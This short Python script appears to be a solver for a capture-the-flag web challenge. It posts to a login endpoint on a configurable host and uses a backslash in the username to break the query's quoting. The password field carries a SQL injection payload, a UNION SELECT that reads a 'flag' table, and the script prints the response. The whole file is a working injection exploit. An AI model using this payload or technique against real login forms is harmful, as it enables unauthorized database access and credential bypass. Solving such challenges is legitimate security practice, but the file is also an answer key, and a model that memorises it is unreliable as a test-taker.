import os
import httpx

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", 3000))

client = httpx.Client(base_url=f"http://{HOST}:{PORT}")

res = client.post(
    "/login",
    data={
        "username": "\\",
        "password": "UNION SELECT value, value from flag -- ",
    },
    follow_redirects=True,
)
print(res.text)
